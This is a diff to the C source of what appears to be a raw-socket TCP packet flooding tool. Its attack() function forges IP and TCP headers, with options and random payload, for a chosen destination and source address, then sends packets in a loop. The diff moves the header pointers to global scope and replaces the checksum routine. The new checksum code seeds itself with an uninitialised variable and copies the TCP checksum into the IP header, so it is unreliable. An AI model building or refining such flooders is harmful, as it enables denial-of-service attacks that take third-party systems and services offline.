@@ -169,7 +169,14 @@ struct icmp
     unsigned short int seq;
 };*/
 
-unsigned short csum(unsigned short* addr, int len)
+// Assemble Headers
+struct ip* pk_iphdr = (struct ip*)datagram;
+struct tcp* pk_tcphdr = (struct tcp*)(datagram + sizeof(struct ip));
+struct tcp_opt* pk_tcpopt = (struct tcp_opt*)(datagram + sizeof(struct ip) + sizeof(struct tcp));
+//struct udp* pk_udphdr = (struct udp*)(datagram + sizeof(struct ip));
+//struct icmp* pk_icmphdr = (struct icmp*)(datagram + sizeof(struct ip));
+
+/*unsigned short csum(unsigned short* addr, int len)
 {
     int nleft = len;
     unsigned int sum = 0;
@@ -190,6 +197,39 @@ unsigned short csum(unsigned short* addr, int len)
     sum += (sum >> 16);
     answer = ~sum;
     return (answer);
+}*/
+
+uint16_t in_cksum(const void* addr, unsigned len, uint16_t init) 
+{
+    uint32_t sum;
+    const uint16_t* word;
+
+    sum = init;
+    word = addr;
+
+    /*
+     * Our algorithm is simple, using a 32 bit accumulator (sum), we add
+     * sequential 16 bit words to it, and at the end, fold back all the
+     * carry bits from the top 16 bits into the lower 16 bits.
+     */
+
+    while (len >= 2) 
+    {
+        sum += *(word++);
+        len -= 2;
+    }
+
+    if (len > 0) 
+    {
+        uint16_t tmp;
+
+        *(uint8_t*)(&tmp) = *(uint8_t*)word;
+        sum += tmp;
+    }
+
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum += (sum >> 16);
+    return ((uint16_t)~sum);
 }
 
 void init_rand(uint32_t x)
@@ -246,11 +286,13 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
 {
     // Used for packet stuff.
     unsigned int pktcount = 0;
+    uint16_t csum;
     // Init code features
     start = time(NULL);
     // Construct network socket.
     struct sockaddr_in sin;
     sin.sin_family = AF_INET; // set socket family
+
 
     // Generate random data
     int x;
@@ -332,8 +374,12 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
     pk_iphdr->ip_off = htons(0x4000);
 
     // Calculate Checksum.
-    pk_iphdr->ip_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes);
-    pk_tcphdr->th_sum = pk_iphdr->ip_sum;
+    csum = in_cksum(datagram, sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes, (uint16_t)~csum);
+    pk_tcphdr->th_sum = csum;
+    pk_iphdr->ip_sum = pk_tcphdr->th_sum;
+
+    //pk_iphdr->ip_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes);
+    //pk_tcphdr->th_sum = pk_iphdr->ip_sum;
 
     #ifdef DEBUG_TCP
     printf("> Loop IP HDR: %u\n", sizeof(struct ip));
@@ -482,8 +528,12 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
         pk_iphdr->ip_off = htons(0x4000);
 
         // Calculate Checksum.
-        pk_iphdr->ip_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes);
-        pk_tcphdr->th_sum = pk_iphdr->ip_sum;
+        csum = in_cksum(datagram, sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes, (uint16_t)~csum);
+        pk_tcphdr->th_sum = csum;
+        pk_iphdr->ip_sum = pk_tcphdr->th_sum;
+
+        //pk_iphdr->ip_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp) + sizeof(struct tcp_opt) + databytes);
+        //pk_tcphdr->th_sum = pk_iphdr->ip_sum;
 
         #ifdef DEBUG_TCP
         printf("> Loop IP HDR: %u\n", sizeof(struct ip));
@@ -541,13 +591,6 @@ int main(int argc, char** argv)
         printf("setsockopt(): cannot set HDRINCL, die.\n");
         exit(-1);
     }
-
-    // Assemble Headers
-    struct ip* pk_iphdr = (struct ip*)datagram;
-    struct tcp* pk_tcphdr = (struct tcp*)(datagram + sizeof(struct ip));
-    struct tcp_opt* pk_tcpopt = (struct tcp_opt*)(datagram + sizeof(struct ip) + sizeof(struct tcp));
-    //struct udp* pk_udphdr = (struct udp*)(datagram + sizeof(struct ip));
-    //struct icmp* pk_icmphdr = (struct icmp*)(datagram + sizeof(struct ip));
 
     // Parse input.
     pktqueue = atoi(argv[2]);
